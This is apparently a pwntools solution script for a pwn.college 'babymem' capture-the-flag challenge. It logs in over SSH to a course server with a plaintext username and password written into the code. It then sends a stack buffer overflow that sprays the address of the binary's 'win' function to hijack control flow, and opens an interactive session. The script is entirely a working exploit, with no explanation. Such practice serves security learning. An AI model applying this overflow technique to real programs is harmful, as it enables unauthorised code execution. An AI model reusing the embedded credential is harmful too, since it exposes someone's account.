from pwn import *

e = ELF('./babymem_level3_testing2')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
p = s.run('/babymem_level3_testing2')

p.sendline(str(0x1000))
p.send(p64(e.symbols['win'])*0x200)

p.interactive()